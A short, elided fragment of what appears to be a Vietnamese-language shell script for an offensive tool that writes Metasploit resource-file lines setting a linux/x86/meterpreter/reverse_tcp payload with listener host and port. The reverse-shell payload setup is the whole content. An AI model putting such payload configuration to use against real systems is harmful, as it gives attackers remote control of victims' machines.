...
no="     Không "
cat << !
Các tùy chọn của tải trọng (linux/x86/meterpreter/reverse_tcp):
...
config_file="$payload_path_present/Config/config"
	echo "set payload linux/x86/meterpreter/reverse_tcp" >> $rc_file
	echo "set EXITFUNC $exitfunc" >> $rc_file
	paylo="linux/x86/meterpreter/reverse_tcp"
	lhost=$lhost
	lport=$lport
}
